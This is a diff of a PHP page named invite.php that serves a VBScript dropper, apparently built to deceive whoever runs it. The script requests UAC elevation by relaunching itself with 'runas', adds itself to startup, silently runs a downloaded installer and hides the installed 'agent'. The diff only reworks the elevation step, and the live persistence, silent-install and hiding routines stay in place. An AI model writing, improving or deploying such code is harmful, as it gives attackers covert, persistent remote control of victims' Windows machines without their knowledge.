@@ -1,5 +1,5 @@
 <?php
-// invite.php - Elevation + Logs + Short Wait
+// invite.php - Improved Elevation Method
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -48,24 +48,16 @@ End Sub
 
 Call Log("Script started")
 
-Function IsElevated()
-    On Error Resume Next
-    Dim wmi, col, item
-    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set col = wmi.ExecQuery("Select * from Win32_Process where ProcessId = " & objShell.ProcessId)
-    For Each item In col
-        IsElevated = (item.GetOwner().Domain = "NT AUTHORITY")
-        Exit Function
-    Next
-    IsElevated = False
-End Function
-
-Sub Elevate()
-    On Error Resume Next
+' ===== IMPROVED ELEVATION =====
+If WScript.Arguments.Length = 0 Then
     Call Log("Requesting UAC elevation...")
-    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
+    Dim shell
+    Set shell = CreateObject("Shell.Application")
+    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 1
     WScript.Quit
-End Sub
+End If
+
+Call Log("Running elevated")
 
 Sub AddToStartup()
     On Error Resume Next
@@ -98,7 +90,7 @@ Sub DownloadAndExecute()
         exitCode = objShell.Run("""" & p & """ /quiet", 0, True)
         Call Log("Installer exit code: " & exitCode & " (0 = success)")
         
-        Call Log("Waiting 90 seconds for install to finish...")
+        Call Log("Waiting 90 seconds...")
         WScript.Sleep 90000
         
         If objFSO.FileExists(p) Then 
@@ -117,15 +109,10 @@ Sub HideAgent()
 End Sub
 
 ' ===== MAIN =====
-If Not IsElevated Then
-    Call Elevate
-Else
-    Call Log("Running with elevation")
-    Call AddToStartup
-    Call DownloadAndExecute
-    Call HideAgent
-    Call Log("All done")
-End If
+Call AddToStartup
+Call DownloadAndExecute
+Call HideAgent
+Call Log("All done")
 
 WScript.Quit
 VBS;
